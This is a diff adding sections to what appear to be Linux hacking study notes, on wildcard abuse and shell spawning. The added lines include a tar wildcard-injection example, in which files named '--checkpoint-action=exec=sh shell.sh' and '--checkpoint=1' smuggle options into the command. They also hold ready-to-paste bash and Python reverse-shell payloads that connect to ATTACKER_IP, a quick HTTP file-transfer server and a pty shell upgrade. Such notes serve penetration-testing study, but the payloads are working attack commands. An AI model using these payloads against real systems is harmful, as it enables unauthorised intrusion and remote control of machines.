@@ -227,7 +227,7 @@ Now, how is PATH used? Simple, when you launch a program without a full path, su
 - The configuration is found within `/etc/sudoers`
 
 
-## Shell Wildcards
+## 🟢 Shell Wildcards
 
 When using shells such as sh or bash, it is often useful to use wildcard characters to perform more complex actions. In the linux environment we have the following wildcard characters, also called "globbing patterns"
 
@@ -236,7 +236,28 @@ When using shells such as sh or bash, it is often useful to use wildcard charact
 - [] (square brackets) : specifies a range.
 - {} (curly brackets) : terms are separated by commas and each term must be the name of
 
+### The Danger of Wildcards
 
+What if an attacker cant modify this command directly cant write on the script that executes this command however this commands has a wild card that reads from some directory and the attacker has control over that directory then it can introduce malicious files with specific file names so that when the wild card is expanded we're going to change the command that is executed.
+
+**Example**
+
+- tar : Create malicious file (echo 'touch /tmp/sc1/hacked' > /tmp/sc1/shell.sh ---> echo "" > "--checkpoint-action=exec=sh shell.sh" ---> echo "--checkpoint=1")
+
+- find , rsync
+
+
+## Shell
+
+**Reverse Shell vs Bind Shell** - Reverse shells are Better
+**File transfer command** - python3 -m http.server 1234
+
+### Spawning a Reverse Shell
+
+- **Bash** : bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
+- **Python** : Reverse shell payload - `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+        Shell Upgrade - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- 
 
 
 
